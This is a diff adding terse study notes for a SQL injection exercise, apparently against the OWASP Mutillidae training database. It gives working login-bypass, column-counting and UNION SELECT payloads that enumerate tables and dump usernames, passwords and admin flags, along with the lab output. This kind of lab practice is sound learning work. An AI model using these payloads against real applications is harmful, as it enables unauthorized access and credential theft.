@@ -1,0 +1,58 @@
+SELECT *  FROM accounts WHERE username='' AND password=''
+
+STEP 1. find the sql vulnerabilitties
+ ' or 1 #
+
+step 2--find the number of columns
+' or 1 ORDER BY 5 #
+' or 1 ORDER BY 6 #   ---column 6 does not exists causing error. we know there are 5 columns.
+
+step 3 must supply matching number of columns when using union (5 here)
+' or 1 UNION SELECT table_catalog, table_schema, table_name, table_type, version FROM INFORMATION_SCHEMA.tables #
+
+----output-----
+Username=owasp10
+Password=accounts
+Signature=BASE TABLE
+
+Username=owasp10
+Password=blogs_table
+Signature=BASE TABLE
+
+Username=owasp10
+Password=captured_data
+Signature=BASE TABLE
+
+Username=owasp10
+Password=credit_cards
+Signature=BASE TABLE
+
+Username=owasp10
+Password=hitlog
+Signature=BASE TABLE
+
+Username=owasp10
+Password=pen_test_tools
+Signature=BASE TABLE
+
+STEP 4
+' or 1 UNION SELECT table_catalog, table_schema, table_name, column_name, data_type FROM INFORMATION_SCHEMA.columns #
+
+--output--
+Username=owasp10
+Password=accounts
+Signature=username
+
+Username=owasp10
+Password=accounts
+Signature=password
+
+Username=owasp10
+Password=accounts
+Signature=mysignature
+
+Username=owasp10
+Password=accounts
+Signature=is_admin
+
+' or 1 UNION SELECT cid, username, password, mysignature, is_admin FROM accounts #
